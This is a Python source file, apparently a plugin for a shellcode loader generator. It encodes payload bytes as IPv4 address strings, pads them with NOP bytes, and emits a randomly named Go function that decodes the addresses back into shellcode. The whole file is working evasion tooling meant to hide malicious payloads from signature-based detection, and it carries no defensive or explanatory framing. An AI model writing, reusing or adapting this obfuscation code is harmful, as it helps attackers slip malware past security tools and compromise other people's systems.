import random
import string

class IPv4Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['strings',
                'strconv']

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + (b"\x90" * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
func {self.name}(encoded []string) []byte {{
    decoded := make([]byte, {self.size} * 4)
    for i, address := range encoded {{
        octets := strings.Split(address, ".")
        for j, octet := range octets {{
            converted, _ := strconv.Atoi(octet)
            decoded[i*4+j] = byte(converted);
        }}
    }}
    return decoded
}}
"""